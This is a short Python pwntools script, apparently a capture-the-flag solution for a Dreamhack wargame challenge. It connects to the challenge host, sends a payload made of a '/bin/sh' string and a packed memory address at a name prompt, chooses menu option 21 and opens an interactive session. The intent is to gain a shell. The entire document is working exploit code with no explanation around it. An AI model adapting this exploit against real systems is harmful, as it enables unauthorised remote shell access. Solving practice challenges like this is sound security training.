from pwn import *
p = remote("host1.dreamhack.games", PORT)
payload = b"/bin/sh\x00"
payload += p32(0x804a0ac)
p.sendlineafter("Admin name: ", payload)
p.sendlineafter("What do you want?: ", b"21")
p.interactive()